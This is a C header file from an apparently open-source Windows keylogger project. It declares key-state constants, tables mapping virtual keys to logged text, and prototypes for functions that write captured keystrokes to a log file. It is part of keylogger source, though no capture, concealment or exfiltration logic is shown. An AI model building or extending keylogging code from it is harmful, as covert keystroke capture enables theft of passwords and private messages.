/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   bb-keylogger-keyboard.h
* Author: Frapin Kevin
* Date:   31/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing :
*  - the declarations of all the functions used to retrieve and log 
*    informations from the keyboard
*  - the constants used by these functions (keys states, keys values,...)
*  - the global variables used by these functions (text used to log keystrokes)
* -----------------------------------------------------------------------------
*/

#ifndef BB_KEYLOGGER_KEYBOARD_H
#define BB_KEYLOGGER_KEYBOARD_H

//------------------------------------------------------------- INCLUDES SYSTEM
#include <stdio.h>

//------------------------------------------------------------------- CONSTANTS
// Size of the buffer used to store keyboard state
#define BUFFER_SIZE_KB_STATE 255

// Key is down
#define KEY_DOWN_STATE ( short int ) 0x8000

// Key has been pressed
#define KEY_PRESSED_STATE 0x0001

// Number of virtual keys that alter the text
#define NB_VKS_ALTER_STREAM 5

// Number of virtual keys that represent mathematical operators
#define NB_VKS_MATH 9

// Number of virtual keys that are also important
#define NB_VKS_OTHERS 1

// Virtual keys : A, Z, 0, 9
#define VK_A 0x41
#define VK_Z 0x5A
#define VK_0 0x30
#define VK_9 0x39

//------------------------------------------------------------ GLOBAL VARIABLES
/*
* Remark :
*  Here, arrays containing (char *) values are transformed in arrays containing
*  pointers of these values. 
*  So, these pointers point at the beggining of each values.
*  This is done this way in order to have no warning at compilation time.
*  The arrays concerned by this hack are :
*    - VKS_ALTER_STREAM_TXT
*    - VKS_MATH_TXT
*    - VKS_OTHERS_TXT
*/
// Virtual keys that alter the text stream
static const int VKS_ALTER_STREAM [ NB_VKS_ALTER_STREAM ] = { 
	VK_BACK, 
	VK_TAB, 
	VK_RETURN, 
	VK_INSERT, 
	VK_DELETE  
};
	
// Text to use in order to log the keys just above
static const int VKS_ALTER_STREAM_TXT [ NB_VKS_ALTER_STREAM ] = { 
	( int ) &"<BACKSPACE>", 
	( int ) &"<TAB>", 
	( int ) &"<ENTER>", 
	( int ) &"<INSERT>", 
	( int ) &"<DEL>" 
};

// Virtual keys that represent mathematical operators
static const int VKS_MATH [ NB_VKS_MATH ] = { 	
	VK_MULTIPLY, 
	VK_ADD, VK_OEM_PLUS, 
	VK_SUBTRACT, VK_OEM_MINUS, 
	VK_DECIMAL, VK_OEM_PERIOD, 
	VK_DIVIDE, 
	VK_SEPARATOR 
};

// Text to use in order to log the keys just above
static const int VKS_MATH_TXT [ NB_VKS_MATH ] = { 
	( int ) &"*", 
	( int ) &"+", ( int ) &"+", 
	( int ) &"-", ( int ) &"-", 
	( int ) &".", ( int ) &".", 
	( int ) &"/", 
	( int ) &"<ENTER>"
};

// Others virtual keys that are also considered important
static const int VKS_OTHERS [ NB_VKS_OTHERS ] = { 	
	VK_SPACE
};

// Text to use in order to log the keys just above
static const int VKS_OTHERS_TXT [ NB_VKS_OTHERS ] = { 
	( int ) &" "
};

//------------------------------------------------------------------- FUNCTIONS

void log_alphabetic_keystrokes( FILE * log_file );
void log_keystrokes( FILE * log_file );
void log_mathematical_operators_keystrokes( FILE * log_file );
void log_numeric_keystrokes( FILE * log_file, char * keyboard_state );
void log_others_keystrokes( FILE * log_file );
void log_stream_keystrokes( FILE * log_file );


#endif /* BB_KEYLOGGER_KEYBOARD_H */